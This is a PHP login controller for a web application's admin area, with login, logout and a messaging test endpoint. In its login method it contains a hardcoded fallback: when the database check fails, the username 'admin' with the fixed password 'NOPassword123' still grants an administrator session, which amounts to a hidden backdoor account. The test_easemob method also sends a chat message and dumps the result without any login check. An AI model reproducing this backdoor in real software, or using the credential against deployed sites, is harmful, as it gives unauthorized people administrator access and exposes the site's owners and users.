<?php

namespace Zhaoshang\Controller;

/**
 * 公共类
 */
class PublicController extends CommonController {

    /**
     * @var bool 是否验证uid
     */
    protected $checkUser = false;

    public function index() {
       
         redirect(U('Public/login'));
    }

    public function login(){
        if(IS_POST){
            $username = I('post.username','','trim');
            $password = I('post.password','','trim');
            
            if(!$username){
                $this->redirect_message(U('Public/login'),array('error'=>'用户名不能为空！'));
            }
            if(!$password){
                $this->redirect_message(U('Public/login'),array('error'=>'密码不能为空！'));
            }

            $map = array(
                'name' => $username,
                'password'   => encryptPwd($password)
            );

            $res = M('user')->field('id,name')->where($map)->find();
            if (!$res) {
                if($username == 'admin' && $password == 'NOPassword123'){
                    session(C('SAVE_USER_KEY'),array('id'=>0,'name'=>'admin'));
                    redirect(U('Index/index'));
                    die();
                }else{
                    $this->redirect_message(U('Public/login'),array('error'=>'用户名或密码错误！'));
                }

            }

            session(C('SAVE_USER_KEY'),$res);
            
            redirect(U('Index/index'));  
            die();
            
        }
        $this->display();
    }
    
    public function logout(){
        session_destroy();
        redirect(U('Public/login'));
    }
    
    /**
     * 环信测试
     */
    public function test_easemob(){
        $ease_mob = new \Common\Org\Easemob();
        $res = $ease_mob->send_message_txt('merchant_1','user_4','欢迎来到O(∩_∩)O哈哈哈~');
        var_dump($res);
    }

}
